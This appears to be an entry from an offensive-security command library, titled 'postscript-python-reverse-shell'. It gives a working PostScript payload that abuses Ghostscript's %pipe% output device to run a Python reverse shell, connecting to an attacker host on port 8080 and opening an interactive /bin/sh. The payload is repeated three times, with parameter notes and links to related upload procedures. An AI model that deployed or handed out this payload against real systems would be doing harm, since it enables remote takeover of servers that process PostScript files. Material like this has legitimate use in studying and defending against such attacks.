---
data: >-
  %!PS

  userdict /setpagedevice undef

  legal

  { null restore } stopped { pop } if

  legal

  mark /OutputFile (%pipe%python -c 'import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice
  putdeviceprops
tags:
  - rce
  - reverse-shell
type: command
executor: postscript
platforms:
  - Web
id: cbc8ba68-fc14-43c0-8d82-0210f3eb3b10
created_at: '2025-12-11T06:10:31.974Z'
updated_at: '2025-12-11T06:10:31.974Z'
verified: false
validated: true
submitted: true
---
# postscript-python-reverse-shell

## Command

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

## Description

Postscript payload that executes a Python reverse shell script when processed by Ghostscript.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `OutputFile` | Specifies pipe to execute Python code | Yes |
| `connect` | Connects to attacker's IP and port 8080 | Yes |

## Examples

### Basic Usage

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

## Expected Output

Establishes a reverse shell connection to the specified IP and port.

## Related

- [[commands/postscript-bash-reverse-shell]]
- [[procedures/Upload-Malicious-Postscript-File]]
